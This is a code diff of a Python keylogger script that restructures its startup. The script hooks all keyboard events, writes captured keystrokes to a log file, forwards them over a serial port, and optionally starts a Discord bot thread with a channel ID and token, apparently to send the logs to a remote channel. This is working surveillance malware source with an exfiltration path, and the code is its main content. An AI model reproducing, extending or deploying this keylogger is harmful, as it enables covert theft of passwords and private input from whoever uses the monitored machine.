@@ -7,23 +7,9 @@ import os
 import keyboard as k
 import datetime
 import serial
-from send_discord import ENABLE_DISCORD_LOGGING , YOUR_CHANNEL_ID, YOUR_TOKEN 
-if ENABLE_DISCORD_LOGGING:
-    from send_discord import buffer_path , run_bot
-SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
-NULL_CHAR = chr(0)
 
-path_log = f"{SCRIPT_PATH}/Log.txt"
-serial_port = r'/dev/ttyS0'
 
-ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
-shift_pressed = False
 
-discord_thread = None
-if ENABLE_DISCORD_LOGGING:
-    discord_thread = threading.Thread(target=run_bot)
-    discord_thread.daemon = True
-    discord_thread.start()
 def on_key_event(e):
     global shift_pressed
     if ENABLE_DISCORD_LOGGING and not discord_thread.is_alive():
@@ -78,18 +64,34 @@ def setup():
     
     log(f"\n============New Session=========\n{datetime.datetime.now().date()}\n{datetime.datetime.now().strftime('%H:%M:%S')}\n")
 if __name__ == "__main__":
-        while True:
-            try:
-                setup()
+        
+        try:
+            from send_discord import ENABLE_DISCORD_LOGGING , YOUR_CHANNEL_ID, YOUR_TOKEN 
+            if ENABLE_DISCORD_LOGGING:
+                from send_discord import buffer_path , run_bot
+            SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
+            NULL_CHAR = chr(0)
+
+            path_log = f"{SCRIPT_PATH}/Log.txt"
+            serial_port = r'/dev/ttyS0'
+            ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
+            shift_pressed = False
+
+            discord_thread = None
+            if ENABLE_DISCORD_LOGGING:
+                discord_thread = threading.Thread(target=run_bot)
+                discord_thread.daemon = True
+                discord_thread.start()
+            setup()
 
 
 
-                k.hook(on_key_event)
-                k.wait()
-            except KeyboardInterrupt:
-                print("closing")
-                ser.write("0,\n".encode("utf-8"))
-                quit()
-            except Exception as e:
-                with open("error_handler.txt", "a") as file:
-                    file.write(str(e))
+            k.hook(on_key_event)
+            k.wait()
+        except KeyboardInterrupt:
+            print("closing")
+            ser.write("0,\n".encode("utf-8"))
+            quit()
+        except Exception as e:
+            with open(f"{SCRIPT_PATH}/error_handler.txt", "a") as file:
+                file.write(str(e))
